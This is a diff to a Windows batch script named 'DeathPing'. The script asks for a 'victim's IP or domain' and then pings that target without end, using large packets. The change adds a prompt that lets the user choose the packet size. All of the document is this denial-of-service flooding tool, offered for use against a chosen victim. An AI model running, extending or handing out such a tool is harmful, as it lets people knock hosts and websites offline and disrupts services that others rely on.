@@ -17,9 +17,10 @@ echo o888bood8P'   `Y8bod8P' `Y888""8o   "888" o888o o888o o888o        o888o o8
 echo                                                                                     d"     YD  
 echo                                                                                     "Y88888P'  
 set /p ip=Insert victim's IP (0.0.0.0) or domain (www.google.com): 
+set /p bytes=Insert number of bytes (65500 maximum): 
 title DeathPing (%username% is running attack against %ip%)
 echo The attack doesn't have ending. To stop the attack, press Ctrl + C.
 timeout /t 5 
 :a
-ping %ip% -n 1 -l 65500
+ping %ip% -n 1 -l %bytes%
 goto a
